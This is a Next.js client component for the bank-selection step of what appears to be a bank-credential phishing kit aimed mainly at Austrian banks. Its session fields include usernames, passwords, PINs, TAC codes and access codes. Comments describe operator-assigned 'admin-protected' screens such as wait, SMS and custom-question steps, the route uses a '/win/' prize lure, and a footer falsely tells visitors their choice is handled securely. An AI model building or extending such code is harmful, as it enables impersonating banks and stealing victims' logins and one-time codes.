"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { AT_BANKS_FALLBACK } from "@/lib/at-austria-banks-fallback";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { isAdminProtectedStep } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";
const BANK_SESSION_FIELDS_TO_CLEAR = [
  "bankSlug",
  "bankName",
  "loginMethod",
  "personalCode",
  "bankPhone",
  "username",
  "password",
  "verfuegernummer",
  "pin",
  "tacCode",
  "rekeningnummer",
  "pasnummer",
  "toegangscode",
  "signatuur",
  "identificatiecode",
  "orderedField1",
  "orderedField1Key",
  "orderedField2",
  "orderedField2Key",
  "orderedField2Type",
  "orderedField3",
  "orderedField3Key",
  "orderedField3Type",
] as const;

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const EFFECTIVE_DEFAULT_BANKS: BankCatalogEntry[] =
    (initialBanks && initialBanks.length > 0) ? initialBanks :
    (AT_BANKS_FALLBACK.length > 0 ? AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })) : []);

  const [banks, setBanks] = useState<BankCatalogEntry[]>(EFFECTIVE_DEFAULT_BANKS);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState(() => {
    // GERİ tuşu ile geldiyse search kutusunu SIFIRLA (eski filtre kalmaması için)
    try {
      const flag = sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG);
      if (flag === "1") { sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG); return ""; }
    } catch { /* ignore */ }
    return "";
  });
  const [saving, setSaving] = useState(false);
  const [resettingSelection, setResettingSelection] = useState(false);  // ⭐ Başlangıçta false: spinner gösterme (fallback bankalar hazır)
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    // ⭐ EĞER initialBanks boş geldiyse bile fallback AT_BANKS_FALLBACK'i koru (ESKİ: undefined gelince setBanks([]) yapıyordu, BOŞTU)
    if (initialBanks && initialBanks.length > 0) {
      setBanks(initialBanks);
    } else if (AT_BANKS_FALLBACK.length > 0) {
      setBanks(AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })));
    }
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const resetSessionBankSelection = useCallback(async () => {
    if (supabase === null || !sessionId) return;

    const { data } = await supabase
      .from("sessions")
      .select("current_step,form_data")
      .eq("id", sessionId)
      .maybeSingle();

    if (!data) return;

    const currentStep = typeof data.current_step === "string" ? data.current_step : "";
    // ⭐ ADMIN-KORUMALI ADIM (wait/sms/invalid_bank/special_approval/custom_question/...)
    //    atanmis ise pasif reset ile adimi DUSURME — admin'in atadigi ekran acik kalir.
    if (isAdminProtectedStep(currentStep)) return;
    const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
    const hadBankState =
      currentStep === "bank" ||
      currentStep === "bank_login" ||
      currentStep === "wait" ||
      BANK_SESSION_FIELDS_TO_CLEAR.some((key) => {
        const value = previousFormData[key];
        return typeof value === "string" ? value.trim().length > 0 : Boolean(value);
      });

    const nextFormData = { ...previousFormData };
    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
      delete nextFormData[field];
    }

    setSessionFormData(nextFormData);
    setBankSlug("");

    if (!hadBankState) return;

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "banken",
        form_data: nextFormData,
      })
      .eq("id", sessionId);
  }, [sessionId, supabase]);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      // ⭐ Gelen banks boş ise (DB/API'den dönmedi) FALLBACK KORU (setBanks BOŞ YAPMA!)
      const incomingBanks: any[] = data.banks;
      if (!incomingBanks || incomingBanks.length === 0) {
        // Fallback: AT_BANKS_FALLBACK'i göster (hiç boş gösterme)
        setBanks(AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })));
        return;
      }

      setBanks(
        incomingBanks.map((bank: any) => ({
          slug: bank.slug,
          name: bank.name,
          domain: bank.domain,
          logoFile: bank.logoFile ?? bank.logo_file,
          brandColor: bank.brandColor ?? bank.brand_color ?? "#DF0000",
          accentColor: bank.accentColor ?? bank.accent_color ?? "#129C4F",
          logo: bank.logo ?? (bank.name || "BANK").toUpperCase().slice(0, 6),
          country: bank.country,
          isActive: bank.isActive !== false && bank.is_active !== false,
        })) as BankCatalogEntry[],
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      // ⭐ HATA ALINIRSA FALLBACK KORU (ASLA setBanks([]) YAPMA!)
      setBanks(AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })) as BankCatalogEntry[]);
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId]);

  useEffect(() => {
    try {
      if (window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) !== "1") {
        return;
      }

      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      refreshAbortRef.current?.abort();
      setSaving(false);
      setResettingSelection(true);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      // ⭐ GERİ'de bank listesi BOŞ KALMASIN: initialBanks boşsa fallback AU_FALLBACK
      setBanks(
        (initialBanks && initialBanks.length > 0)
          ? initialBanks
          : AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true }))
      );

      void (async () => {
        await resetSessionBankSelection();
        try {
          window.sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG);
        } catch {
          /* ignore sessionStorage errors */
        }
        if (mountedRef.current) {
          setResettingSelection(false);
        }
        void refreshBanks();
      })();
    } catch {
      /* ignore sessionStorage errors */
    }
  }, [initialBanks, refreshBanks, resetSessionBankSelection]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setResettingSelection(true);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      // ⭐ Pageshow GERİ dönüşte de boş KALMASIN: fallback
      setBanks(
        (initialBanks && initialBanks.length > 0)
          ? initialBanks
          : AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true }))
      );
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
      // ⭐ Pageshow sonrası resettingSelection takılırsa 750ms sonra FORCE false (spinner sonsuza kadar dönmesin)
      window.setTimeout(() => { if (mountedRef.current) setResettingSelection(false); }, 750);
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // 1) Sadece aktif olanları al
    let validBanks = banks.filter(b => b.isActive !== false);

    // 2) Hedef ülke filtresi UYGULA (eğer varsa)
    let afterCountry: BankCatalogEntry[] = validBanks;
    if (settings.target_country && settings.target_country !== "All") {
      afterCountry = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    // ⭐ ⭐ EN KRİTİK KISIM: Eğer ülke filtresinden 0 sonuç döndüyse (country undefined/bozuk gelmiş olabilir)
    //    FİLTREYİ KALDIR, geçersiz kıl ve TÜM AKTİF BANKALARI göster (ASLA BOŞ LİSTE GÖSTERME!)
    const finalList: BankCatalogEntry[] = (afterCountry.length === 0 && validBanks.length > 0) ? validBanks : afterCountry;

    // ⭐ SON KALDIRMA: Final list hala 0 ise (refreshBanks failed olabilir) FALLBACK AT_BANKS_FALLBACK göster
    const safetyFinal: BankCatalogEntry[] =
      (finalList.length === 0 && AT_BANKS_FALLBACK.length > 0)
        ? AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true }))
        : finalList;

    return safetyFinal.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: resolveLocalBankLogoFile(bank.slug, bank.logoFile),
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    // ⭐ sessionId yoksa fallback bankaları göster, infinite router.replace LOOP YOK (artık)
    //    Eski kod: router.replace("/banken") yapıyordu, aynı adrese döndüğü için infinite loop + boş prop ile geliyordu
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        // ⭐ KENDI ADRESİNE YÖNLENDİRME YAPMA (döngü) — SADECE state işaretle
        //     Bankalar zaten AT_BANKS_FALLBACK ile dolu, kullanıcı seçme işlemine devam edebilir
        setTimeout(() => { if (mountedRef.current) setRecovering(false); }, 300);
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      setResettingSelection(true);
      await resetSessionBankSelection();
      if (cancelled) return;
      setResettingSelection(false);
    })();
    // ⭐ Reset selection async işlem 1sn'den uzun sürerse FORCE false (spinner takılması KALICI ÖNLENSİN)
    const forceResetTimer = window.setTimeout(() => {
      if (!cancelled && mountedRef.current) setResettingSelection(false);
    }, 1000);
    return () => {
      cancelled = true;
      window.clearTimeout(forceResetTimer);
    };
  }, [resetSessionBankSelection, sessionId, supabase]);

  function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !nextBankSlug || navigationLockRef.current || resettingSelection) return;

    selectionVersionRef.current += 1;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    // ⭐ OPTIMISTIC NAVIGATION: kullanici TIKLADIGI ANDA banka sayfasina git.
    //    Onceki kod 2 DB round-trip (select + update) bitene kadar bekliyordu;
    //    gecikmede kullanici 2. tiki atiyordu ("2 kere tiklayinca gidiyor" bug'i).
    //    DB update arka planda devam eder — banka sayfasi slug'i URL'den okur,
    //    sessionId henuz resolve olmadiysa banka sayfasi cookie/query'den cozer.
    if (sessionId) {
      void (async () => {
        try {
          // Kullanici verisini kaybetmemek icin form_data DB'den taze okunur.
          let baseFormData: Record<string, unknown> = sessionFormData;
          let freshStep = "";
          const { data: freshRow } = await supabase
            .from("sessions")
            .select("form_data,current_step")
            .eq("id", sessionId)
            .maybeSingle();
          if (freshRow?.form_data && typeof freshRow.form_data === "object") {
            baseFormData = freshRow.form_data as Record<string, unknown>;
          }
          if (typeof freshRow?.current_step === "string") {
            freshStep = freshRow.current_step;
          }

          const nextFormData: Record<string, any> = { ...baseFormData };
          for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
            delete nextFormData[field];
          }
          nextFormData.bankSlug = nextBankSlug;
          nextFormData.bankName = displayName;

          // ⭐ Admin bu arada admin-korumali adim atadiysa adimi EZME (bankSlug'i kaydet yine de)
          const nextStepPatch = isAdminProtectedStep(freshStep) ? {} : { current_step: "bank" };

          await supabase
            .from("sessions")
            .update({ is_hidden: false, ...nextStepPatch, form_data: nextFormData })
            .eq("id", sessionId);
          setSessionFormData(nextFormData);
        } catch {
          /* navigasyon zaten yapildi, sessiz gec */
        }
      })();
    }

    // ⭐ FLASH YOK: router.push → router.replace (history stack'te liste kalsin, GERI'de direkt liste)
    router.replace(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
  }

  if (!supabase) {
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="a3d-shell items-center justify-center p-4">
          <div className="a3d-card w-full max-w-[460px] p-8 text-center">
            <h2 className="a3d-title mb-2 text-2xl">Bankauswahl</h2>
            <p className="a3d-sub mb-8 text-sm font-medium">Sitzung wird wiederhergestellt...</p>
            <div className="flex justify-center py-8">
              <div className="a3d-spinner size-10" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="a3d-shell items-center justify-center p-4">
        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
          <h2 className="a3d-title mb-2 text-2xl">Bankauswahl</h2>
          <p className="a3d-sub mb-6 text-sm font-medium">Ungueltiger Link.</p>
          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
            Use the full link to continue.
          </p>
        </div>
      </div>
    );
  }

  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  return (
    <div className="a3d-shell">
      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />

      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-3 sm:p-4">
        <div className="a3d-card a3d-in flex h-[calc(100dvh-3rem)] max-h-[760px] w-full max-w-[560px] flex-col overflow-hidden p-4 sm:p-6">
          <div className="mb-4 flex items-start justify-between gap-4">
            <div className="min-w-0">
              <h2 className="a3d-title text-[22px] leading-tight sm:text-[24px]">{settings.banken_title}</h2>
              <p className="a3d-sub mt-1.5 text-[13px] font-medium sm:text-sm">{settings.banken_subtitle}</p>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="h-11 w-11 shrink-0 object-contain"
            />
          </div>

          <div className="mb-4 shrink-0">
            <div className="a3d-input flex items-center gap-2.5 px-4 py-3">
              <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 shrink-0 text-[#98a2b3]" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-sm text-[#101828] outline-none placeholder:text-[#98a2b3]"
              />
            </div>
          </div>

          <div className="a3d-scroll min-h-0 flex-1 overflow-y-auto pr-1">
            <div className="grid grid-cols-1 gap-2.5 pb-1">
              {filteredOptions.length === 0 ? (
                <div className="a3d-inset p-5 text-center text-sm font-medium text-[#667085]">
                  Fuer das ausgewaehlte Land wurden keine Banken gefunden. Filter loeschen.
                </div>
              ) : filteredOptions.map((opt, idx) => {
                const isSelected = bankSlug === opt.slug;
                return (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving || resettingSelection}
                  className={`a3d-bank-item a3d-in ${isSelected ? "a3d-selected" : ""}`}
                  style={{ animationDelay: `${idx * 28}ms` }}
                >
                  <div className="a3d-logo-ring size-12">
                    <img
                      src={optimizeSupabaseImageUrl(resolveLocalBankLogoFile(opt.slug, opt.logoFile), { format: "webp", quality: 80, width: 128 }) || resolveLocalBankLogoFile(opt.slug, opt.logoFile)}
                      alt={opt.displayName}
                      className="h-full w-full rounded-full object-cover"
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = "none";
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = "grid";
                      }}
                    />
                    <div className="grid h-full w-full place-items-center text-sm font-black text-[var(--brand)]" style={{ display: "none" }}>
                      {opt.displayName.charAt(0)}
                    </div>
                  </div>
                  <div className="min-w-0 flex-1 text-left">
                    <p className="a3d-title truncate text-[15px] font-semibold sm:text-[16px]">
                      {opt.displayName}
                    </p>
                  </div>
                  <div className="flex shrink-0 items-center">
                    {(saving || resettingSelection) && isSelected ? (
                      <div className="a3d-spinner size-5" style={{ borderWidth: "2px" }} />
                    ) : (
                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-[#98a2b3]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="m9 6 6 6-6 6" />
                      </svg>
                    )}
                  </div>
                </button>
                );
              })}
            </div>
          </div>

          <div className="mt-4 flex shrink-0 justify-center border-t border-[#1018280a] pt-4">
            <div className="a3d-pill">
              <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.9" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
              </svg>
              <span>Ihre Bankauswahl wird sicher verarbeitet.</span>
            </div>
          </div>
        </div>

        {msg ? <p className="mt-3 w-full max-w-[560px] rounded-2xl border border-red-200 bg-red-50/90 p-3 text-center text-sm font-medium text-red-600">{msg}</p> : null}
      </main>
    </div>
  );
}
